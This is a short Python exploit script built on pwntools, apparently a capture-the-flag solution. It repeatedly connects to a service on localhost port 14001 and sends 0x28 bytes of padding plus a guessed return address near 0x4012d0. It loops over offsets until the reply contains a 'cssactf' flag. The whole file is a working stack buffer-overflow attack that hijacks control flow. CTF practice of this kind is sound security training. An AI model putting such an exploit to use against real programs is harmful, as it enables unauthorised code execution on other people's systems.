#!/usr/bin/env python

# First we import functions from the pwntools library
from pwn import *

# The remote function allows us to connect to a remote server


# Too lazy to figure out the exact offset and padding so just LOOP TIL IT WORKS!!!!!
for i in range(0, 100):
    for k in range(0, 100):
        connection = remote("localhost", 14001)
        connection.sendline(b'a' * 0x28 + p64(0x4012d0 + k))
        res = connection.recvall()
        if "cssactf" in res.decode():
            print(res)
            exit(0)
        connection.close()